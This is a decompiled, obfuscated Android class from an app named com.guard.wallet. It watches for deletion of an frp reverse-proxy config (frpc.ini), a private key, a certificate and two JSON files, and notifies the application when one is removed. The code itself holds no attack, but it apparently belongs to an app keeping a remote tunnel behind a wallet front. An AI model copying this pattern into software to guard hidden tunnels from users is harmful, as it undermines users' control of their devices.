package y;

import a1.q;
import android.os.FileObserver;
import com.guard.wallet.MainApplication;

public final class b extends FileObserver {
   public final j.e a;

   public b(String var1, j.e var2) {
      super(var1, 512);
      this.a = var2;
   }

   public final void onEvent(int var1, String var2) {
      if ((var1 & 4095) == 512) {
         this.a.getClass();
         if (!q.B(var2)
            && (
               var2.contains("frpc.ini")
                  || var2.contains("private.key")
                  || var2.contains("cert.pem")
                  || var2.contains("listenWindows.json")
                  || var2.contains("locateValues.json")
            )
            && MainApplication.getInstance() != null) {
            if (var2.contains("frpc.ini")) {
               MainApplication.getInstance().onConfigFileDelete("frpc.ini");
            } else if (var2.contains("private.key")) {
               MainApplication.getInstance().onConfigFileDelete("private.key");
            } else if (var2.contains("cert.pem")) {
               MainApplication.getInstance().onConfigFileDelete("cert.pem");
            } else if (var2.contains("listenWindows.json")) {
               MainApplication.getInstance().onConfigFileDelete("listenWindows.json");
            } else {
               MainApplication.getInstance().onConfigFileDelete("locateValues.json");
            }
         }
      }
   }
}
